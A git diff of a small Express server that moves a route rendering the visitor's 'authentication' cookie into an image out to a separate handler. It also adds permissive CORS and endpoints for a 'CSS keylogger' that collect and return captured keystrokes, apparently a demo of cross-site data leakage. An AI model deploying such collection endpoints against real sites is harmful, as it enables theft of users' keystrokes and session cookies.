@@ -1,38 +1,26 @@
 const express = require("express");
-const path = require("path");
 const cookieParser = require("cookie-parser");
-const textToImage = require("text-to-image");
+var cors = require('cors')
+
+const cookieImageHandler = require('./routes/cookie-image')
+const cssKeyLoggerAddKeyHandler = require('./routes/css-keylogger/addKey')
+const cssKeyLoggerGetKeysHandler = require('./routes/css-keylogger/getKeys')
 
 const app = express();
+app.use(cors())
+
 app.use(cookieParser());
+app.use('/static', express.static('public'))
 const port = process.env.PORT || 8080;
 
 app.get("/", (req, res) => {
   res.send("Use to get /image.png to get an image!");
 });
 
-app.get("/image.png", async (req, res) => {
-  const userAuthentication =
-    req.cookies.authentication || "No authentication cookie found!";
-  const textStyle = {
-    fontSize: 18,
-    fontFamily: "Arial",
-    lineHeight: 30,
-    margin: 10,
-    textAlign: 'center',
-    bgColor: "#32064A",
-    textColor: "white",
-  };
-  const imgData = await textToImage.generate(userAuthentication, textStyle);
-  const base64Data = imgData.replace(/^data:image\/(png|jpeg|jpg);base64,/, "");
-  const img = Buffer.from(base64Data, "base64");
+app.get("/image.png", cookieImageHandler);
+app.get("/css-keylogger/add-key", cssKeyLoggerAddKeyHandler);
+app.get("/css-keylogger/keys", cssKeyLoggerGetKeysHandler);
 
-  res.writeHead(200, {
-    "Content-Type": "image/png",
-    "Content-Length": img.length,
-  });
-  res.end(img);
-});
 
 app.listen(port, () => {
   console.log(`Example app listening at http://localhost:${port}`);
